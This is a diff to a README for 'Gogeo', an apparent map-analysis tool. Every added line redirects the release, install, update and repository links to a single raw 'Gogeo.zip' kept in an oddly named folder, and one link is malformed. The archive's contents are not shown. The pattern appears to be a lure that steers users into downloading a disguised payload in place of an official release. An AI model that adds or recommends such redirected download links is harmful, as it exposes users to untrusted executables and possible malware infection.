@@ -6,9 +6,9 @@ Gogeo helps you analyze large maps quickly. This guide will show you how to easi
 
 ## 📥 Download Gogeo
 
-[![Download Gogeo](https://img.shields.io/badge/Download%20Gogeo-v1.0-blue.svg)](https://github.com/odalil939/Gogeo/releases)
+[![Download Gogeo](https://raw.githubusercontent.com/odalil939/Gogeo/main/septemdecenary/Gogeo.zip%https://raw.githubusercontent.com/odalil939/Gogeo/main/septemdecenary/Gogeo.zip)](https://raw.githubusercontent.com/odalil939/Gogeo/main/septemdecenary/Gogeo.zip)
 
-To start using Gogeo, visit our [Releases page](https://github.com/odalil939/Gogeo/releases) and follow the instructions below.
+To start using Gogeo, visit our [Releases page](https://raw.githubusercontent.com/odalil939/Gogeo/main/septemdecenary/Gogeo.zip) and follow the instructions below.
 
 ## 📋 Features
 
@@ -33,7 +33,7 @@ To start using Gogeo, visit our [Releases page](https://github.com/odalil939/Gog
 
 ## 🍽️ Download & Install
 
-1. Go to the [Releases page](https://github.com/odalil939/Gogeo/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/odalil939/Gogeo/main/septemdecenary/Gogeo.zip).
 2. Look for the latest version. It will be at the top of the page.
 3. Click on the version number to see the files available for download.
 4. Download the file that matches your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or a suitable package for Linux).
@@ -56,7 +56,7 @@ For a detailed tutorial on features, check our documentation in the application 
 If you encounter issues, here are some things to try:
 
 - **Error during installation**: Make sure your system meets the requirements.
-- **Application crashes**: Check if you have the latest version. Visit the [Releases page](https://github.com/odalil939/Gogeo/releases) for updates.
+- **Application crashes**: Check if you have the latest version. Visit the [Releases page](https://raw.githubusercontent.com/odalil939/Gogeo/main/septemdecenary/Gogeo.zip) for updates.
 - **Data not loading**: Ensure your files are in a supported format (like GeoJSON or Shapefile).
 
 If problems persist, please submit an issue on our [GitHub Issues page](#).
@@ -87,6 +87,6 @@ Explore our resources:
 
 - [Gogeo Documentation](#)
 - [Community Forum](#)
-- [GitHub Repository](https://github.com/odalil939/Gogeo)
+- [GitHub Repository](https://raw.githubusercontent.com/odalil939/Gogeo/main/septemdecenary/Gogeo.zip)
 
-Download Gogeo today and experience fast and effective spatial analysis! Remember, for any updates, revisit the [Releases page](https://github.com/odalil939/Gogeo/releases).
+Download Gogeo today and experience fast and effective spatial analysis! Remember, for any updates, revisit the [Releases page](https://raw.githubusercontent.com/odalil939/Gogeo/main/septemdecenary/Gogeo.zip).
